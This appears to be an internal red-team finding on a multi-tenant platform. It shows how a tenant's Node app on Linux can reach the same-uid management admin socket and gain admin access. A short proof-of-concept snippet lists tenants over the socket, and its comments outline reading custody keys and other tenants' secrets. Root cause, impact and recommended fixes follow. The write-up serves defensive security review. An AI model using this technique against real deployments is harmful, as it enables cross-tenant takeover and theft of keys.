# RT-03 PoC — Node-tier → platform takeover via mgmt admin unix socket (Linux)

**Finding:** RT-03 (Critical on the Node tier / Linux process tier).

**Claim attacked:** STATUS "0700 is not isolation on the process tier … The Seatbelt
profile closes all of these on macOS." and M9 "a malicious Node app can bypass the
proxy (raw sockets)". The platform trusts the OS filesystem/socket sandbox for
per-tenant isolation; on Linux there is none (Seatbelt is macOS-only,
`ResolveSandbox → none` off macOS, and no Landlock/seccomp is wired into the
process or Node tiers — only the unbuilt microVM tier confines Linux).

**Root cause (code):**
- `mgmt/server.go:ListenUnix` + `uidListener.Accept` authorize the admin API
  purely by `peercred` same-uid. Every twd component **and every tenant Node
  app** runs as the same uid.
- `hostd/node.go` runs the tenant's app as a plain Node process. On Linux no
  sandbox is applied, so the app has full filesystem + AF_UNIX access.

**Exploit (hostile tenant Node app, Linux process/node tier):**

```js
// Dropped into any twd Node workload (templates/node-*). No native exploit,
// no V8 escape: ordinary Node with raw socket + fs access as the shared uid.
import net from "node:net";
import fs from "node:fs";

// 1. Find mgmt's admin socket + custody/API-key material under the state dir.
//    (~/.twd/run/mgmt.sock, ~/.twd/<...>/custody.key, tenant apiKeyFile paths
//    returned by GET /v0/tenants). Dirs are 0700 but same-uid => readable.
const sock = process.env.HOME + "/.twd/run/mgmt.sock";

// 2. Speak the mgmt admin HTTP API over the socket as the "local" principal
//    (LocalHandler treats every same-uid connection as admin).
const c = net.createConnection(sock, () => {
  c.write("GET /v0/tenants HTTP/1.1\r\nHost: twd\r\nConnection: close\r\n\r\n");
});
c.on("data", (b) => process.stdout.write(b)); // => every tenant + apiKeyFile path

// 3. With admin access: kill ANY tenant's objects, enumerate objects/leases,
//    read each tenant's node keys from ~/.twd state dirs, read mgmt custody.key
//    and decrypt custody secrets, read tenant API key files.
```

**Impact:** full cross-tenant compromise from unprivileged tenant code on the
Linux Node tier (no memory-safety bug required). On the Linux *workerd* process
tier the same holds once a V8 isolate escape yields native execution. Breaks the
E2E-MULTI isolation claim on Linux. macOS is mitigated by the Seatbelt profile.

**Status accuracy:** STATUS is honest — it flags "0700 is not isolation",
"a hostd compromise exposes every tenant's node keys" (M7 gap), and "the Node
tier on Linux has no per-tenant confinement" (integration gap). But the
**E2E-MULTI "isolation holds" headline and DoD item 2 are macOS-only**; they do
not hold on the Linux process or Node tiers, which the docs present as
first-class (`LINUX-PLAN`). This should be stated as a hard precondition.

**Recommended fix:** do not rely on same-uid peercred for the mgmt admin socket.
Options: (a) run each tenant workload under a distinct uid + per-tenant
filesystem namespace; (b) require the Node/process tiers to run only inside the
microVM tier on Linux (reject `tier: process`/`node` on multi-tenant Linux
hosts); (c) authenticate the mgmt admin socket with a per-component secret
token, not uid. Until then, document Linux process/Node tiers as
**single-tenant only**.

**Execution note:** not run live here — this red-team host is macOS (no Linux
hostd running, and the task forbids touching the engineers' Lima VMs). The
exploit is grounded in the cited code (`mgmt/server.go`, `hostd/node.go`,
`hostd/seatbelt.go` runtime-gated to macOS). The regression test
`rt03_mgmt_socket_test.go` encodes the desired access-control invariant.
